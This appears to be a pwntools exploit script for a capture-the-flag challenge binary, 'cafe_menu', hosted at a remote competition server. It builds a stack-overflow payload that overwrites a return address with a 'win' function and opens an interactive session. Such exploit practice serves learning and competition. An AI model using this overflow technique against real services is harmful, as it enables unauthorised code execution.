from pwn import *

context.binary=elf=ELF("./cafe_menu")

p=process(elf.path)
p=remote("offsec.m0lecon.it",13584)
p.recv()

ret=ROP(elf).find_gadget(['ret'])[0]
payload=flat(
    b'a'*48,
    b'\x47',
    p64(elf.sym.win),
    b'\xff'

    
)
#gdb.attach(p)
p.sendline(payload)

p.interactive()